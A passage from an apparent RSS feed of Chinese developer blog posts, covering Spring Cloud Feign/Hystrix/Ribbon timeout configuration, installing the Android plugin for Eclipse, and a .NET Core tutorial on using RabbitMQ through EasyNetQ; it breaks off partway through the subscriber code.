to {[/api/v1/users/],methods=[GET]}: There is already 'userClientFallback' bean method
public java.util.List&amp;lt;com.test.cloud.vo.UserVo&amp;gt; com.test.cloud.client.UserClientFallback.list() mapped.
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;事实上，我们并不是要将FeignClient给注册到RequestMapping里的，而且OpenFeign也有自己的一套注解方案。只是spring-cloud为了方便集成和简化OpenFeign的用法，把Spring-Web的注解做了适配。不好的地方是RequestMapping的扫描并没有排除。&lt;/p&gt;
&lt;p&gt;以下代码会找到方法注解@RequestMapping.&lt;/p&gt;
&lt;p&gt;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;private RequestMappingInfo createRequestMappingInfo(AnnotatedElement element) {
        RequestMapping requestMapping = AnnotatedElementUtils.findMergedAnnotation(element, RequestMapping.class);
        RequestCondition&amp;lt;?&amp;gt; condition = (element instanceof Class ?
                getCustomTypeCondition((Class&amp;lt;?&amp;gt;) element) : getCustomMethodCondition((Method) element));
        return (requestMapping != null ? createRequestMappingInfo(requestMapping, condition) : null);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而RequestMapping这个bean创建完后会扫描所有bean, 并注册&lt;/p&gt;
&lt;p&gt;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.MappingRegistry#register&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public void register(T mapping, Object handler, Method method) {
            this.readWriteLock.writeLock().lock();
    try {
        HandlerMethod handlerMethod = createHandlerMethod(handler, method);
        assertUniqueMethodMapping(handlerMethod, mapping);

        if (logger.isInfoEnabled()) {
            logger.info(&quot;Mapped \&quot;&quot; + mapping + &quot;\&quot; onto &quot; + handlerMethod);
        }
        this.mappingLookup.put(mapping, handlerMethod);

        List&amp;lt;String&amp;gt; directUrls = getDirectUrls(mapping);
        for (String url : directUrls) {
            this.urlLookup.add(url, mapping);
        }

        String name = null;
        if (getNamingStrategy() != null) {
            name = getNamingStrategy().getName(handlerMethod, mapping);
            addMappingName(name, handlerMethod);
        }

        CorsConfiguration corsConfig = initCorsConfiguration(handler, method, mapping);
        if (corsConfig != null) {
            this.corsLookup.put(handlerMethod, corsConfig);
        }

        this.registry.put(mapping, new MappingRegistration&amp;lt;T&amp;gt;(mapping, handlerMethod, directUrls, name));
    }
    finally {
        this.readWriteLock.writeLock().unlock();
    }
}
private void assertUniqueMethodMapping(HandlerMethod newHandlerMethod, T mapping) {
    HandlerMethod handlerMethod = this.mappingLookup.get(mapping);
    if (handlerMethod != null &amp;amp;&amp;amp; !handlerMethod.equals(newHandlerMethod)) {
        throw new IllegalStateException(
                &quot;Ambiguous mapping. Cannot map '&quot; + newHandlerMethod.getBean() + &quot;' method \n&quot; +
                newHandlerMethod + &quot;\nto &quot; + mapping + &quot;: There is already '&quot; +
                handlerMethod.getBean() + &quot;' bean method\n&quot; + handlerMethod + &quot; mapped.&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;总之，由于这个冲突，fallback必须制定一个随意不相干的url地址。等后面我学会怎么手动排除RequestMapping的时候就不用了。&lt;/p&gt;
&lt;h3 id=&quot;接下来直接调用feignclient&quot;&gt;接下来，直接调用FeignClient&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;@Api
@RestController
@RequestMapping(&quot;/api/v1/users&quot;)
public class UserController {

    private final UserClient userClient;

    @Autowired
    public UserController(UserClient userClient) {
        this.userClient = userClient;
    }


    @GetMapping(&quot;/feign&quot;)
    public List&amp;lt;UserVo&amp;gt; feign() {
        return userClient.list();
    }

    @GetMapping(&quot;/feign-fallback&quot;)
    public String fallback() {
        return userClient.fallback();
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在provider-api里，我设计&lt;code&gt;userClient.list()&lt;/code&gt;返回用户列表，&lt;code&gt;userClient.fallback()&lt;/code&gt;随机报500. 这样，启动，访问两个api可以观察到服务降级了。&lt;/p&gt;
&lt;h2 id=&quot;关于feignhystrixribbon的配置&quot;&gt;关于Feign，Hystrix，Ribbon的配置&lt;/h2&gt;
&lt;p&gt;我目前用到的配置有以下几种，不全，暂时有这些&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#eureka客户端ribbon刷新时间
#默认30s
ribbon.ServerListRefreshInterval: 5000

# ribbon默认配置
#ribbon.ConnectTimeout=250
#ribbon.ReadTimeout=1000
#ribbon.OkToRetryOnAllOperations=true
#ribbon.MaxAutoRetriesNextServer=2
#ribbon.MaxAutoRetries=0

# feign日志配置, 指定某个service的日志级别
#logging.level.com.test.cloud.client.UserClient: info

# ribbon全局默认连接和等待时间
ribbon.ConnectTimeout: 1000
ribbon.ReadTimeout: 10000

# ribbon指定service的连接和等待时间，注意service的名称要和在FeignClient注解里标注的内容一致, 要大写
PROVIDER-DEMO.ribbon.ConnectTimeout: 1000
PROVIDER-DEMO.ribbon.ReadTimeout: 1000

# feign全局开启hystrix支持,默认false
feign.hystrix.enabled: true
# hystrix全局默认超时时间
hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds: 5000
# hystrix指定request的单独设置超时时间， commandkey的组成为ClientClassName#methodName(ParamTypeClassName..)
hystrix.command.UserClient#list().execution.isolation.thread.timeoutInMilliseconds: 5000&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;需要注意的是，需要理解几个超时的概念。即，需要明白hystrix是干啥的，ribbon又是干啥的，Feign如何把它们集成的。&lt;/p&gt;
&lt;h3 id=&quot;feign&quot;&gt;Feign&lt;/h3&gt;
&lt;p&gt;OpenFeign可以配置超时，日志，序列化和反序列化，重试等。只要手动声明对应的bean即可。具体配置见&lt;/p&gt;
&lt;p&gt;org.springframework.cloud.netflix.feign.FeignClientsConfiguration&lt;/p&gt;
&lt;p&gt;值得注意的是，默认不会重试&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Bean
@ConditionalOnMissingBean
public Retryer feignRetryer() {
    return Retryer.NEVER_RETRY;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以及，默认不会采用hystrix&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Configuration
@ConditionalOnClass({ HystrixCommand.class, HystrixFeign.class })
protected static class HystrixFeignConfiguration {
    @Bean
    @Scope(&quot;prototype&quot;)
    @ConditionalOnMissingBean
    @ConditionalOnProperty(name = &quot;feign.hystrix.enabled&quot;, matchIfMissing = false)
    public Feign.Builder feignHystrixBuilder() {
        return HystrixFeign.builder();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;需要引入hystrix class和配置&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;feign.hystrix.enabled: true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;hystrix&quot;&gt;Hystrix&lt;/h3&gt;
&lt;p&gt;有关具体原理信息，参见&lt;a href=&quot;https://github.com/Netflix/Hystrix&quot;&gt;官网&lt;/a&gt;。个人简单理解，Hystrix为每个依赖的服务创建一个线程池，服务在线程池里执行，hystrix会有一些策略决定什么时候执行超时，还可以获得执行结果的成功率。于是可以指定一些策略，比如超时后中断线程，比如成功率在某一段时间低于阀值后拒绝服务执行。这样就像一个保险丝一样，当不满足我们设置的策略时，直接烧断了，从而起到保护服务资源的作用。当然，实现会更复杂，还有恢复机制。&lt;/p&gt;
&lt;p&gt;所以，hystrix会有个超时的配置，决定线程执行时间。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# hystrix全局默认超时时间
hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds: 5000
# hystrix指定request的单独设置超时时间， commandkey的组成为ClientClassName#methodName(ParamTypeClassName..)
hystrix.command.UserClient#list().execution.isolation.thread.timeoutInMilliseconds: 5000&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在Feign集成Hystrix的时候，把&lt;code&gt;ClientClassName#methodName(ParamTypeClassName..)&lt;/code&gt;设置成Hystrix的CommandKey, CommandKey就是hystrix执行策略的最小单位，比如对应某个http请求，对应这个请求的最长时间即我们设置的超时。&lt;/p&gt;
&lt;p&gt;feign.Feign#configKey(java.lang.Class, java.lang.reflect.Method)&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public static String configKey(Class targetType, Method method) {
    StringBuilder builder = new StringBuilder();
    builder.append(targetType.getSimpleName());
    builder.append('#').append(method.getName()).append('(');
    for (Type param : method.getGenericParameterTypes()) {
      param = Types.resolve(targetType, targetType, param);
      builder.append(Types.getRawType(param).getSimpleName()).append(',');
    }
    if (method.getParameterTypes().length &amp;gt; 0) {
      builder.deleteCharAt(builder.length() - 1);
    }
    return builder.append(')').toString();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Feign会把host当作groupkey, 这里则是我们的服务名。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://oe20lp6p0.bkt.clouddn.com/2018/springcloud/consumer-demo/feign-hystrix-key.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当然，还有更多细节的配置，比如线程池，时间窗口大小等。见&lt;a href=&quot;https://github.com/Netflix/Hystrix/wiki/Configuration&quot;&gt;官网Configuration&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ribbon&quot;&gt;Ribbon&lt;/h3&gt;
&lt;p&gt;Ribbon采用客户端负载均衡。与服务端负载均衡对应，比如我们访问baidu.com, 域名解析器后转向某个负载均衡设备来决定我们的请求打到哪台机器上，对于我们请求者来说是透明的，我们不知道负载信息。&lt;/p&gt;
&lt;p&gt;而Ribbon则是自己维护所有可用的服务列表，根据某种策略，去选择请求哪个服务实例。比如随机选取，线性轮询选取，在线性轮询的基础上重试选取，权重选取，Zone优先选取等。&lt;/p&gt;
&lt;p&gt;在Feign集成Ribbon的时候，把两个超时时间委托给Ribbon。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public FeignLoadBalancer(ILoadBalancer lb, IClientConfig clientConfig,
                             ServerIntrospector serverIntrospector) {
    super(lb, clientConfig);
    this.setRetryHandler(RetryHandler.DEFAULT);
    this.clientConfig = clientConfig;
    this.connectTimeout = clientConfig.get(CommonClientConfigKey.ConnectTimeout);
    this.readTimeout = clientConfig.get(CommonClientConfigKey.ReadTimeout);
    this.serverIntrospector = serverIntrospector;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在不和Ribbon集成的时候，OpenFeign会设置连接超时和读取超时&lt;/p&gt;
&lt;p&gt;feign.Client.Default#convertAndSend&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; final HttpURLConnection
          connection =
          (HttpURLConnection) new URL(request.url()).openConnection();
      if (connection instanceof HttpsURLConnection) {
        HttpsURLConnection sslCon = (HttpsURLConnection) connection;
        if (sslContextFactory != null) {
          sslCon.setSSLSocketFactory(sslContextFactory);
        }
        if (hostnameVerifier != null) {
          sslCon.setHostnameVerifier(hostnameVerifier);
        }
      }
      connection.setConnectTimeout(options.connectTimeoutMillis());
      connection.setReadTimeout(options.readTimeoutMillis());&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而和Ribbon集成后，Feign会读取ribbon的两个时间设置，即&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# ribbon全局默认连接和等待时间
ribbon.ConnectTimeout: 1000
ribbon.ReadTimeout: 10000

# ribbon指定service的连接和等待时间，注意service的名称要和在FeignClient注解里标注的内容一致, 要大写
PROVIDER-DEMO.ribbon.ConnectTimeout: 1
PROVIDER-DEMO.ribbon.ReadTimeout: 1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;关于单独执行某个服务的超时配置，区别Ribbon全局时间配置，这个idea没有自动提示，debug了半天源码，找到配置为服务名大写+&lt;code&gt;.ribbon.ConnectTimeout&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;com.netflix.client.config.DefaultClientConfigImpl#getInstancePropName(java.lang.String, java.lang.String)&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public String getInstancePropName(String restClientName, String key) {
    return restClientName + &quot;.&quot; + this.getNameSpace() + &quot;.&quot; + key;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里设置为1只是为了测试超时设置。debug追踪发现，确实如此。这种最佳实践真的只能自己去实践。&lt;/p&gt;
&lt;h3 id=&quot;调优&quot;&gt;调优&lt;/h3&gt;
&lt;p&gt;由于http rest请求的复杂性，可能需要调整超时时间，心跳时间，甚至根据当前服务的请求速率设置线程池大小和排队大小，设置熔断条件等。这个只能在监控上线后，根据监控信息去对应修改需要的配置。目前我还没有最佳实践，不乱说了。&lt;/p&gt;
&lt;h2 id=&quot;结尾&quot;&gt;结尾&lt;/h2&gt;
&lt;p&gt;到这里，在启动了eureka，provider之后，启动consumer就可以实现远程调用了。嗯，基本满足开发需求了。访问feign的接口，观察admin里两个provider的请求，可以发现我们的请求确实负载到不同的instance上了。访问fallback接口，可以看到失败的时候会执行我们的降级策略。&lt;/p&gt;
&lt;h2 id=&quot;miao语&quot;&gt;Miao语&lt;/h2&gt;
&lt;p&gt;基础很重要，基础很重要，基础非常重要。&lt;/p&gt;
</description>
<pubDate>Wed, 04 Jul 2018 22:43:00 +0000</pubDate>
<dc:creator>Ryan.Miao</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/woshimrf/p/springcloud-consumer.html</dc:identifier>
</item>
<item>
<title>eclipse安装Android插件 - 新哲</title>
<link>http://www.cnblogs.com/Prode/p/9266201.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Prode/p/9266201.html</guid>
<description>&lt;p&gt;1.首先下载Eclipse for android,点击进入。下载这个版本可以省去ADT配置（）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1287763/201807/1287763-20180704231932599-1644728519.png&quot; alt=&quot;&quot; width=&quot;387&quot; height=&quot;138&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.下载符合你电脑的版本&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1287763/201807/1287763-20180704233954614-1809037017.png&quot; alt=&quot;&quot; width=&quot;491&quot; height=&quot;188&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.现在Android SDK，地址：http://tools.android-studio.org/index.php/sdk&lt;/p&gt;
&lt;p&gt;3.启动Eclipse,选择windows&amp;gt;preferences&amp;gt;android&lt;/p&gt;
&lt;p&gt;红圈填写Android sdk路径，Apply。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1287763/201807/1287763-20180705004904805-1780154278.png&quot; alt=&quot;&quot; width=&quot;472&quot; height=&quot;375&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 4.下载自己所需的Android版本&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1287763/201807/1287763-20180705005115664-2063115837.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 04 Jul 2018 17:12:00 +0000</pubDate>
<dc:creator>新哲</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Prode/p/9266201.html</dc:identifier>
</item>
<item>
<title>.NET Core微服务之基于EasyNetQ使用RabbitMQ消息队列 - Edison Chou</title>
<link>http://www.cnblogs.com/edisonchou/p/aspnetcore_easynetq_basicdemo_foundation.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/edisonchou/p/aspnetcore_easynetq_basicdemo_foundation.html</guid>
<description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;Tip:&lt;/strong&gt;&lt;/em&gt; 此篇已加入&lt;a title=&quot;find more ?&quot; href=&quot;https://www.cnblogs.com/edisonchou/p/dotnetcore_microservice_foundation_blogs_index.html&quot; target=&quot;_blank&quot;&gt;.NET Core微服务基础系列文章索引&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;1.1 消息队列&lt;/h2&gt;
&lt;p&gt;　　“&lt;strong&gt;消息&lt;/strong&gt;”是在两台计算机间传送的数据单位。消息可以非常简单，例如只包含文本字符串；也可以更复杂，可能包含嵌入对象。消息被发送到队列中，“&lt;strong&gt;消息队列&lt;/strong&gt;”是在消息的传输过程中保存消息的&lt;strong&gt;容器&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images0.cnblogs.com/i/381412/201407/041103320274863.jpg&quot; alt=&quot;&quot; width=&quot;538&quot; height=&quot;112&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　消息队列（Message Queue），是分布式系统中重要的组件，其通用的使用场景可以简单地描述为：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;当不需要立即获得结果，但是并发量又需要进行控制的时候，差不多就是需要使用消息队列的时候。　　&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;　　消息队列主要解决了应用耦合、异步处理、流量削锋等问题。当前使用较多的消息队列有RabbitMQ、RocketMQ、ActiveMQ、Kafka、ZeroMQ、MetaMq等，而部分数据库如Redis、Mysql以及phxsql也可实现消息队列的功能。更多详细内容请参考：《&lt;a href=&quot;https://cloud.tencent.com/developer/article/1006035&quot; target=&quot;_blank&quot;&gt;消息队列及其应用场景介绍&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　我也在前几年写过一篇&lt;a href=&quot;https://www.cnblogs.com/edisonchou/p/3825682.html&quot; target=&quot;_blank&quot;&gt;基于Redis做消息队列&lt;/a&gt;的文章，对消息队列的一个应用场景做了介绍，没有了解过的童鞋可以看看。&lt;/p&gt;
&lt;h2&gt;1.2 RabbitMQ&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/668104/201709/668104-20170919144417181-47072786.png&quot; alt=&quot;&quot; width=&quot;399&quot; height=&quot;221&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　RabbitMQ是一款基于AMQP（高级消息队列协议），由Erlang开发的开源消息队列组件。是一款优秀的消息队列组件，他由两部分组成：服务端和客户端，客户端支持多种语言的驱动，如：.Net、JAVA、Erlang等。&lt;/p&gt;
&lt;p&gt;　　网上有很多性能比较的文章，例如在1百万条1k的消息下，每秒种的收发情况如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2015.cnblogs.com/blog/398358/201603/398358-20160321170239823-1094091655.jpg&quot; alt=&quot;性能比较&quot; width=&quot;467&quot; height=&quot;327&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这里不过多介绍RabbitMQ，有关RabbitMQ的一些需要了解的概念你可以通过下面的文章了解：&lt;/p&gt;
&lt;p&gt;　　颜圣杰，《&lt;a href=&quot;https://www.cnblogs.com/sheng-jie/p/7192690.html&quot; target=&quot;_blank&quot;&gt;RabbitMQ知多少&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　如果你想了解RabbitMQ与Kafka的对比，可以阅读这篇文章：《&lt;a href=&quot;https://blog.csdn.net/yssycz/article/details/80133084&quot; target=&quot;_blank&quot;&gt;开源软件成熟度评测报告-分布式消息中间件&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　而EasyNetQ呢，它是一款基于RabbitMQ.Client封装的API库，正如其名，使用起来比较Easy，它把原RabbitMQ.Client中的很多操作都进行了再次封装，让开发人员减少了很多工作量。&lt;/p&gt;

&lt;h2&gt;2.1 Linux下的安装&lt;/h2&gt;
&lt;p&gt;　　这里不演示如何在Linux下安装，但&lt;span&gt;推荐生产环境使用Linux&lt;/span&gt;，下面是一些参考资料：&lt;/p&gt;
&lt;p&gt;　　mcgrady，《&lt;a href=&quot;https://www.cnblogs.com/mcgrady/p/7614417.html&quot; target=&quot;_blank&quot;&gt;Linux下RabbitMQ的安装&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　晓晨Master，《&lt;a href=&quot;https://www.cnblogs.com/stulzq/p/7551819.html&quot; target=&quot;_blank&quot;&gt;.NET Core使用RabbitMQ&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　牛头人，《&lt;a href=&quot;https://www.cnblogs.com/web424/p/6761153.html&quot; target=&quot;_blank&quot;&gt;Linux安装RabbitMQ&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;　　一只猪儿虫，《&lt;a href=&quot;https://www.cnblogs.com/spicy/p/7017603.html&quot; target=&quot;_blank&quot;&gt;RabbitMQ Linux安装&lt;/a&gt;》&lt;/p&gt;
&lt;h2&gt;2.2 Windows下的安装&lt;/h2&gt;
&lt;p&gt;　　开发环境下，我一般使用Windows Server虚拟机，所以这里说明下如何在Windows下安装：&lt;/p&gt;
&lt;p&gt;　　（1）下载&lt;a href=&quot;http://www.erlang.org/downloads&quot; target=&quot;_blank&quot;&gt;Erlang&lt;/a&gt;和&lt;a href=&quot;http://www.rabbitmq.com/download.html&quot; target=&quot;_blank&quot;&gt;RabbitMQ&lt;/a&gt; (这里我选则的并非最新版本，而是etp20.3和rabbitmq3.7.5)&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180703234751669-1699581780.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（2）首先安装Erlang，然后添加环境变量（如果添加了，则skip这一步）并加到PATH中&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180703235248856-317559420.png&quot; alt=&quot;&quot; width=&quot;316&quot; height=&quot;146&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（3）其次安装RabbitMQ，一路Next，安装完成后也为其添加环境变量并添加到PATH中&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180703235705686-1149420263.png&quot; alt=&quot;&quot; width=&quot;447&quot; height=&quot;342&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704000231199-557711545.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（4）检查是否安装成功：rabbitmqctl status&lt;/p&gt;
&lt;p&gt;　　这里我碰到了如下的错误：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704000419105-172675234.png&quot; alt=&quot;&quot; width=&quot;592&quot; height=&quot;335&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　解决方法：&lt;/p&gt;
&lt;p&gt;　　更正erlang.cookie文件，详情请参考：&lt;a href=&quot;https://blog.csdn.net/u012637358/article/details/80078610&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/u012637358/article/details/80078610&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　最终状态：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704000728955-1937217658.png&quot; alt=&quot;&quot; width=&quot;593&quot; height=&quot;297&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　检查Windows服务，发现已经自动注册了一个服务：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704001034276-1404887603.png&quot; alt=&quot;&quot; width=&quot;464&quot; height=&quot;356&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（5）激活Web管理插件，然后检查是否可见（http://127.0.0.1:15672）&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704001515667-383849630.png&quot; alt=&quot;&quot; width=&quot;585&quot; height=&quot;147&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704001851262-1562075045.png&quot; alt=&quot;&quot; width=&quot;510&quot; height=&quot;226&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;2.3 一些必要的配置&lt;/h2&gt;
&lt;p&gt;　　（1）使用默认账号:guest/guest登录进去，添加一个新用户（Administrator权限），并设置其Permission&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704004822832-808714308.png&quot; alt=&quot;&quot; width=&quot;516&quot; height=&quot;401&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（2）添加新的虚拟机（默认为/，这里我添加一个名为EDCVHOST的虚拟机）&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704005131139-2083764939.png&quot; alt=&quot;&quot; width=&quot;524&quot; height=&quot;133&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（3）绑定新添加的用户到新的虚拟机上，接下来在我们的程序中就主要使用admin这个用户和EDCVHOST这个虚拟机&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704005238964-312757315.png&quot; alt=&quot;&quot; width=&quot;350&quot; height=&quot;165&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;em&gt;*.当然，为了安全考虑，你也可以把guest用户remove掉&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;3.1 项目准备&lt;/h2&gt;
&lt;p&gt;　　这里为了快速的演示如何使用EasyNetQ，我们来一个QuickStart，准备三个项目：两个Console程序和一个Class Library。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704224446261-1001596995.png&quot; alt=&quot;&quot; width=&quot;372&quot; height=&quot;89&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　其中，对Publisher和Subscriber项目安装EasyNetQ：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;NuGet&amp;gt;Install-Package EasyNetQ　　&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;　　针对Messages类库，新增一个class如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TextMessage
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Text { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;3.2 我是Publisher&lt;/h2&gt;
&lt;p&gt;　　添加以下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Program
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Main(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] args)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; connStr = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host=192.168.80.71;virtualHost=EDCVHOST;username=admin;password=edison&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; bus =&lt;span&gt; RabbitHutch.CreateBus(connStr))
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; input = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;
                Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Please enter a message. 'Quit' to quit.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; ((input = Console.ReadLine()) != &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Quit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
                {
                    bus.Publish(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; TextMessage
                    {
                        Text &lt;/span&gt;=&lt;span&gt; input
                    });
                }
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　可以看到，我们在其中使用EasyNetQ高度封装的接口创建了一个IBus接口的实例，通过这个IBus实例我们可以通过一个超级Easy的Publish接口进行发布消息。这里主要是读取用户在控制台中输入的消息字符串进行发送。实际中，发送的一般都是一个或多个复杂的实体对象。&lt;/p&gt;
&lt;h2&gt;3.3 我是Subscriber&lt;/h2&gt;
&lt;p&gt;　　添加如下所示代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Program
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Main(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] args)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; connStr = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;host=192.168.80.71;virtualHost=EDCVHOST;username=admin;password=edison&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; bus =&lt;span&gt; RabbitHutch.CreateBus(connStr))
            {
